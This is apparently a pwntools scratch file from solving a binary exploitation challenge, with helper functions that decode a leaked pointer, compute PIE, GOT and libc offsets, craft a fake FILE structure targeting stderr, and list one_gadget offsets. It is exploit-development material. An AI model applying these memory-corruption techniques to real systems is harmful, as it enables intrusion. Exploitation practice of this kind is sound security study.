from pwn import *
import re

def test1():
    # Example input string
    #s = "AAAAA@\xa1\xa7I\xdea\nOtherDataHere"
    s = "AAAAA@!\x86l\x8f^\nOtherDataHere"


    # Regular expression to match the pattern
    match = re.search(r'A([^\nA]+)\n', s)

    # Extract the matched string
    if match:
        extracted_string = match.group(1)
        print(extracted_string)
    else:
        print("No match found")

    extracted_string = match.group(1)
    a = extracted_string.encode('latin1')

    #s = b"@\xa1\xa7I\xdea"
    #s = b'A\x41\x41\x41\x41\x41'

    print(a.ljust(8, b'\x00'))

    hex_value = u64(a.ljust(8, b'\x00')) 

    print(hex(hex_value))

def test2():
    pie_base = 0x569bc205e000
    #padding = b'A' * 48
    context_0 = pie_base + 0x5140
    stderr_ptr = pie_base + 0x50e0  
    stderr_withOffset =  stderr_ptr - 0x18
    attack_vector =  p64(context_0) + b'0' * 8 + p64(stderr_withOffset)
    print(len(attack_vector))

def test3():
    pie_base = 0x569bc205e000
    stderr_ptr = pie_base + 0x50e0
    context_0 = pie_base + 0x5140
    fake = flat({
        0x00: p64(0xfbad0000),         # flags
        0x08: p64(stderr_ptr),         # _IO_read_ptr
        0x10: p64(stderr_ptr + 8),     # _IO_read_end
    })
    fakeFile_ptr = pie_base + 0x5150
    stderr_withOffset =  fakeFile_ptr - 0x18
    attack_vector = p64(context_0) + b'0' * 8 + p64(stderr_withOffset) + b'0' * 8 + fake
    print(len(attack_vector))



def test4():
    s = b"user1"
    s = b"pass1"
    print(hex(unpack(s, 'all', endian='little', sign=False)))

def test5():
    # exec one
    t1 = 0x647068c3c2a0 - 0x647068c3c000
    t2 = 0x647068c3c6f0 - 0x647068c3c000
    file = 0x647068c3c750 - 0x647068c3c000

    print(hex(t1))
    print(hex(t2))
    print(hex(file))
    print("----------------")

    # exec two
    base = 0x63d8caa40000
    t1 = 0x63d8caa402a0 - base
    t2 =  0x63d8caa406f0 - base
    file = 0x63d8caa40750 - base

    print(hex(t1))
    print(hex(t2))
    print(hex(file))
    print("----------------")

    #exec three
    base = 0x5d1f3b5ef000
    inp = 0x5d1f3b5ef320 - base
    print(hex(inp))
    
def test6():
    base = 0x7d657a08c000
    diff = 0x00007d657a25f680 - base
    print(hex(diff))
    
def test7():
    # verify libc leak
    true = 0x7fc328f83000
    calc = 0x7fc328f83000
    print(true == calc)
    
def test8():
    base = 0x5bc6e5efc000
    currentGotPrintf = 0x5bc6e5f01030
    print(hex(currentGotPrintf - base))
    
def test9():
    from one_gadget import generate_one_gadget

    path_to_libc = '/code/libc.so.6'

    for offset in generate_one_gadget(path_to_libc):
        print(offset)

# execute
test9()